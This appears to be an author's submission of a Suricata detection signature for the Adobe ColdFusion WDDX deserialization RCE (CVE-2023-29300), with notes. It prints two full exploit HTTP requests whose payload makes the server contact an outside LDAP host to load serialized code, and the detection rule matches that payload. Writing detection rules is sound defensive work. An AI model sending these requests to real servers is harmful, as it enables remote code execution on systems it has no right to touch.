# ET Open Submission (Return from PCRE grave)
### May 2nd, 2024
### Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300)


![8olo1g](https://github.com/eatinsundip/Suricata/assets/43767555/aadafd56-30f9-4747-bb3e-2d78dcfa22f4)


## Resources

1. [https://github.com/taythebot/CVE-2022-46169](https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2023-29300)
2. [https://blog.projectdiscovery.io/adobe-coldfusion-rce/](https://blog.projectdiscovery.io/adobe-coldfusion-rce/)

### The exploit itself:

```
POST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 333


argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://your.ldap.server/example</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>
```

I was however able to get the LDAP calls to fire on much less.

```
POST /CFIDE/adminapi/accessmanager.cfc?method=ANYTHINGHERE HTTP/1.1
Host: localhost
User-Agent: curl/8.5.0
Accept: */*
Content-Length: 387
Content-Type: application/x-www-form-urlencoded

argumentCollection=%3CwddxPacket%20version%3D%271.0%27%3E%3Cheader%2F%3E%3Cdata%3E%3Cstruct%20type%3D%27xcom.sun.rowset.JdbcRowSetImplx%27%3E%3Cvar%20name%3D%27dataSourceName%27%3E%3Cstring%3Eldap%3A%2F%2F192.168.1.144%2Ftest.ser%3C%2Fstring%3E%3C%2Fvar%3E%3Cvar%20name%3D%27autoCommit%27%3E%3Cboolean%20value%3D%27true%27%2F%3E%3C%2Fvar%3E%3C%2Fstruct%3E%3C%2Fdata%3E%3C%2FwddxPacket%3E
```

## Signature

```alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300)"; flow:established,to_server; http.method; content:"POST"; bsize:4; http.uri; content:"/CFIDE/adminapi/accessmanager.cfc?method="; startswith; fast_pattern; http.request_body; content:"argumentCollection|3d 3c|wddxPacket|20|version|3d 27|1|2e|0|27 3e 3c|header|2f 3e 3c|data|3e 3c|struct|20|type|3d 27|xcom|2e|sun|2e|rowset|2e|JdbcRowSetImplx|27 3e 3c|var|20|name|3d 27|dataSourceName|27 3e 3c|string|3e|ldap|3a 2f 2f|"; content:"|3c 2f|string|3e 3c 2f|var|3e 3c|var|20|name|3d 27|autoCommit|27 3e 3c|boolean|20|value|3d 27|true|27 2f 3e 3c 2f|var|3e 3c 2f|struct|3e 3c 2f|data|3e 3c 2f|wddxPacket|3e|"; distance:3; within:500; sid:1; rev:1; metadata:attack_target Server, created_at 2024_05_02, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2024_05_02;)```

[Job Zip](https://github.com/eatinsundip/Suricata/files/15190887/9dfa93c65d3bbd7d.zip)


[http://dalton.securitymidwest.net/dalton/job/e3b1b130f7c2aeff](http://dalton.securitymidwest.net/dalton/job/e3b1b130f7c2aeff)


## NOTES
- I am a little rusty and very open to critique
- I plan to get a working LDAP server to host malicious serialized code.
	- I have never attempted RCE with an LDAP server so it's a learning experience.
 - With this being written in Suri5, I am missing a url_decode ont eh http.request_body
